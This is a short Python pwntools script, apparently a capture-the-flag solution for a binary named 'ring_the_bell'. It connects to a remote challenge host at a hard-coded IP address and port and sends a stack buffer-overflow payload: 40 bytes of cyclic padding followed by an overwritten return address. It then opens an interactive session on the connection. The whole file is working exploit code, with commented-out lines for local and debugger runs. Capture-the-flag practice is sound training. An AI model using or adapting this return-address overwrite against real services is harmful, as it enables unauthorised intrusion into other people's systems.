from pwn import *

# context.terminal = ['zellij', 'action', 'new-pane', '-d', 'right', '--']
# get the binary from your actual challenge instance
context.arch = 'amd64'
context.endian = 'little'

p = remote('154.57.167.75', 31773)
# p = process('./ring_the_bell')
# p = gdb.debug('./ring_the_bell', aslr=True, gdbscript='b *main+136')

payload = cyclic(0x28) + p64(0x0040176d)

p.writeafter(b'[Rin]: ', payload + b'\n')
p.interactive()
